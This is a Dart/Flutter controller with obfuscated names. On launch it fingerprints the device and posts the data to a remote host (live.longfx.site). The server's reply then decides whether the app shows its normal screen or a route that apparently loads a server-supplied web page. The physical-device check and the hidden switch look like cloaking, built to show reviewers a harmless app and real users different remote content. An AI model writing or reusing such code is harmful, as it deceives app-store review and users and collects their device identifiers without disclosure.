import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var jasqthb = RxBool(false);
  var moibavrl = RxBool(true);
  var uweod = RxString("");
  var wallace = RxBool(false);
  var muller = RxBool(true);
  final vuimntk = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    czsibyen();
  }


  Future<void> czsibyen() async {

    wallace.value = true;
    muller.value = true;
    moibavrl.value = false;

    vuimntk.post("https://live.longfx.site/VpMerqP08i4gWOk",data: await tucibajkg()).then((value) {
      var nlaos = value.data["nlaos"] as String;
      var pwkn = value.data["pwkn"] as bool;
      if (pwkn) {
        uweod.value = nlaos;
        lloyd();
      } else {
        stehr();
      }
    }).catchError((e) {
      moibavrl.value = true;
      muller.value = true;
      wallace.value = false;
    });
  }

  Future<Map<String, dynamic>> tucibajkg() async {
    final DeviceInfoPlugin cwrjs = DeviceInfoPlugin();
    PackageInfo wtebp_udbk = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var gcxd = Platform.localeName;
    var rTBFsOwG = currentTimeZone;

    var ydjtpwS = wtebp_udbk.packageName;
    var LMRciCyQ = wtebp_udbk.version;
    var BJAZTm = wtebp_udbk.buildNumber;

    var pLNrZb = wtebp_udbk.appName;
    var agustinaWolf = "";
    var TSNim  = "";
    var kicUen = "";
    var tremaineLehner = "";
    var XiFSz = "";
    var jarrettWilliamson = "";


    var ADWViln = "";
    var lourdesRunolfsdottir = "";
    var JbfpWmgL = false;

    if (GetPlatform.isAndroid) {
      ADWViln = "android";
      var zbkhsqnj = await cwrjs.androidInfo;

      kicUen = zbkhsqnj.brand;

      XiFSz  = zbkhsqnj.model;
      TSNim = zbkhsqnj.id;

      JbfpWmgL = zbkhsqnj.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      ADWViln = "ios";
      var awuzxmd = await cwrjs.iosInfo;
      kicUen = awuzxmd.name;
      XiFSz = awuzxmd.model;

      TSNim = awuzxmd.identifierForVendor ?? "";
      JbfpWmgL  = awuzxmd.isPhysicalDevice;
    }
    var res = {
      "pLNrZb": pLNrZb,
      "LMRciCyQ": LMRciCyQ,
      "ydjtpwS": ydjtpwS,
      "XiFSz": XiFSz,
      "tremaineLehner" : tremaineLehner,
      "rTBFsOwG": rTBFsOwG,
      "kicUen": kicUen,
      "gcxd": gcxd,
      "ADWViln": ADWViln,
      "lourdesRunolfsdottir" : lourdesRunolfsdottir,
      "JbfpWmgL": JbfpWmgL,
      "BJAZTm": BJAZTm,
      "jarrettWilliamson" : jarrettWilliamson,
      "agustinaWolf" : agustinaWolf,
      "TSNim": TSNim,

    };
    return res;
  }

  Future<void> stehr() async {
    Get.offAllNamed("/in_tab");
  }

  Future<void> lloyd() async {
    Get.offAllNamed("/in_main");
  }

}
